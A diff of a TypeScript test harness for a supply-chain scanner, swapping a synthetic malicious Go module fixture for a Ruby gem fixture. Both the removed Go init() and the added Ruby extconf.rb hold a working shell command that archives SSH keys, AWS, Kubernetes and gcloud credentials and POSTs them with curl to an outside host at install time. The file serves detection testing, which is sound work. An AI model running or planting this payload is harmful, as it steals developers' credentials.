@@ -1,52 +1,50 @@
 /**
- * test-go-package.ts
+ * test-ruby-package.ts
  *
- * Ad hoc Go module scanner for manual validation. Uses synthetic module
- * contents but reuses the production package planning and analysis logic.
+ * Ad hoc Ruby gem scanner for manual validation. Uses synthetic gem contents
+ * but reuses the production package planning and analysis logic.
  */
 
 import assert from 'node:assert/strict';
-import { parseTestLLMOptions } from './test-llm-options.js';
-import { formatTriageResults } from './src/supply-chain/llm/tools.js';
-import { createChatModel } from './src/supply-chain/llm/client.js';
-import { analyzePackageWithModel, planPackageInvestigation } from './src/supply-chain/nodes/primary-analysis.js';
-import type { PackageMetadata, PackageSource, RegistrySignals } from './src/supply-chain/types.js';
+import { parseTestLLMOptions } from './helpers/llm-options.js';
+import { formatTriageResults } from '../src/supply-chain/llm/tools.js';
+import { createChatModel } from '../src/supply-chain/llm/client.js';
+import { analyzePackageWithModel, planPackageInvestigation } from '../src/supply-chain/nodes/primary-analysis.js';
+import type { PackageMetadata, PackageSource, RegistrySignals } from '../src/supply-chain/types.js';
 
 const TARGETS = [
   {
-    label: 'malicious Go init exfiltration module',
-    version: 'v0.0.1-malicious-fixture',
+    label: 'malicious Ruby extconf credential harvester',
+    version: '0.1.0-malicious-fixture',
     source: {
-      name: 'github.com/example/telemetry-helper',
-      ecosystem: 'go',
-      version: 'v0.0.1-malicious-fixture',
-      installScripts: {},
+      name: 'rackup-helper',
+      ecosystem: 'ruby',
+      version: '0.1.0-malicious-fixture',
+      installScripts: {
+        'extconf.rb': `require 'mkmf'`,
+      },
       fileList: [
-        'github.com/example/telemetry-helper@v0.0.1/go.mod',
-        'github.com/example/telemetry-helper@v0.0.1/init.go',
-        'github.com/example/telemetry-helper@v0.0.1/helper.go',
+        'data.tar.gz/rackup-helper.gemspec',
+        'data.tar.gz/extconf.rb',
+        'data.tar.gz/lib/rackup_helper.rb',
       ],
       fileContents: {
-        'github.com/example/telemetry-helper@v0.0.1/go.mod': `module github.com/example/telemetry-helper
-
-go 1.22
+        'data.tar.gz/rackup-helper.gemspec': `Gem::Specification.new do |spec|
+  spec.name = "rackup-helper"
+  spec.version = "0.1.0-malicious-fixture"
+  spec.summary = "Synthetic malicious Ruby gem fixture"
+  spec.extensions = ["extconf.rb"]
+end
 `,
-        'github.com/example/telemetry-helper@v0.0.1/init.go': `package telemetry
+        'data.tar.gz/extconf.rb': `require 'fileutils'
 
-import (
-  "os"
-  "os/exec"
-)
-
-func init() {
-  home, _ := os.UserHomeDir()
-  _ = home
-  _ = exec.Command("/bin/sh", "-c", "tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/loot.tgz").Run()
-}
+system("tar czf /tmp/loot.tgz ~/.ssh/id_rsa ~/.aws/credentials ~/.kube/config ~/.config/gcloud && curl -X POST https://models.litellm.cloud/ --data-binary @/tmp/loot.tgz")
 `,
-        'github.com/example/telemetry-helper@v0.0.1/helper.go': `package telemetry
-
-func Enabled() bool { return true }
+        'data.tar.gz/lib/rackup_helper.rb': `module RackupHelper
+  def self.enabled?
+    true
+  end
+end
 `,
       },
       suspiciousFiles: {},
@@ -54,34 +52,36 @@ func Enabled() bool { return true }
   },
 ];
 
-const llmOptions = parseTestLLMOptions('test-llm-go-package.ts');
+const llmOptions = parseTestLLMOptions('llm-ruby-package.test.ts');
 
 function buildFakeMetadata(version: string): PackageMetadata {
   const signals: RegistrySignals = {
     maintainerChangedInLatestRelease: false,
     previousMaintainers: [],
     newMaintainers: [],
-    packageAgeDays: 10,
+    packageAgeDays: 14,
     publishedDaysAgo: 1,
     typosquatCandidate: null,
-    isDependencyConfusion: true,
+    isDependencyConfusion: false,
     hasProvenance: false,
-    riskScore: 7,
+    riskScore: 6,
   };
 
   return {
-    name: 'github.com/example/telemetry-helper',
-    ecosystem: 'go',
+    name: 'rackup-helper',
+    ecosystem: 'ruby',
     latestVersion: version,
-    previousVersion: 'v0.0.0',
+    previousVersion: '0.0.9',
     createdAt: '2026-03-01T00:00:00Z',
     updatedAt: new Date().toISOString(),
-    weeklyDownloads: 0,
-    maintainers: [],
-    hasInstallScripts: false,
-    installScripts: {},
-    repositoryUrl: 'https://github.com/example/telemetry-helper',
-    description: 'Synthetic malicious Go fixture for supply-chain testing.',
+    weeklyDownloads: 10,
+    maintainers: ['unknown'],
+    hasInstallScripts: true,
+    installScripts: {
+      'extconf.rb': 'ruby extconf.rb',
+    },
+    repositoryUrl: 'https://example.invalid/rackup-helper',
+    description: 'Synthetic malicious Ruby fixture for supply-chain testing.',
     registrySignals: signals,
   };
 }
@@ -94,7 +94,7 @@ async function scanTarget(target: typeof TARGETS[0]) {
   const { allContent, triageResults, filesToInvestigate } = planPackageInvestigation(target.source);
 
   console.log('\n' + formatTriageResults(triageResults, allContent.size).split('\n').map(l => '  ' + l).join('\n'));
-  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation \n`);
+  console.log(`\n  ${filesToInvestigate.length} file(s) selected for LLM investigation\n`);
 
   assert(
     filesToInvestigate.length > 0,
@@ -146,5 +146,5 @@ for (const target of TARGETS) {
   }
 }
 
-assert(targetsWithIssues === TARGETS.length, 'Expected every Go target to be flagged by the test harness');
+assert(targetsWithIssues === TARGETS.length, 'Expected every Ruby target to be flagged by the test harness');
 console.log('\n✅ Done\n');
